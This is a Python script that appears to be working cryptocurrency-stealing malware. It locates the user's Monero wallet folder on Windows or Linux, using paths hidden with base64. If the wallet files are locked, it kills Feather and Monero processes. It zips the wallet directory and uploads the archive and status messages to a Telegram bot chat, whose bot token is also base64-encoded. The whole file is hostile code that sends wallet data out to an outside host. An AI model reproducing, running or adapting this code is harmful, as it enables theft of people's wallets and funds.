import platform
from tempfile import TemporaryDirectory
import base64
import shutil
import os
import psutil
import requests

XMR_WIN = base64.b64decode(b'QzpcVXNlcnNce31cRG9jdW1lbnRzXE1vbmVybw==').decode().format(os.getlogin())
XMR_LINUX = base64.b64decode(b'L2hvbWUve30vTW9uZXJv').decode().format(os.getlogin())
TK = base64.b64decode(b'ODg1MTQ4OTgxNjpBQUd2NC1GRXpaamk0VFlDb3FvTloxc3ZVSmZUdVFoNmtVcw==').decode()
CHAT_ID = -5044692933


def log_text(text): 
    requests.post(
        f"https://api.telegram.org/bot{TK}/sendMessage",
        data={
            "chat_id": CHAT_ID,
            "text": text,
        },
    )

def upload_file(zipf): 
    sys = platform.system()
    fname = ''
    if sys == "Windows":
        fname = zipf + '\\dmp.zip'
    else:
        fname = zipf + '/dmp.zip'

    with open(fname, "rb") as f:
        requests.post(
            f"https://api.telegram.org/bot{TK}/sendDocument",
            data={
                "chat_id": CHAT_ID,
                "caption": "Here's the report",
            },
            files={
                "document": f,
            },
        )

def mk_archive(dir, outdir):
    shutil.make_archive(
        '{}'.format(outdir),
        'zip', '{}'.format(dir),
        './'
    )

def kill_processes():
    for proc in psutil.process_iter():
        if 'feather' in proc.name():
            proc.kill()
        if 'monero' in proc.name():
            proc.kill()

def announce_discovery(exd):
    if exd:
        log_text('Found wallet... sending\n')
    else:
        log_text('Did not find any wallets.\n')


def exfil(tmp_dir: TemporaryDirectory):
    path = ''
    sys = platform.system()
    if sys == "Windows":
        path = XMR_WIN
    if sys == "Linux":
        path = XMR_LINUX

    if not os.path.exists(path):
        log_text('Did not find wallets. Quit\n')
        return

    exd = False
    pt = '{}/dmp'.format(tmp_dir.name)
    try:
        mk_archive(path, pt)
        exd = True
        """
        shutil.make_archive('{}/dmp'.format(tmp_dir.name),
                            'zip', 
                            'C:\\Users\\{}\\Documents\\'.format(os.getlogin()),
                            'Monero')
        """
    except PermissionError:
        kill_processes()
        try:
            mk_archive(path, pt)
            exd = True
        except:
            exd = False
    finally:
        announce_discovery(exd)

    if exd:
        upload_file(tmp_dir.name)
    

tmp_dir = TemporaryDirectory(delete=False)
#os.mkdir(tmp_dir.name)
sys = platform.system()

#print(tmp_dir)


exfil(tmp_dir)
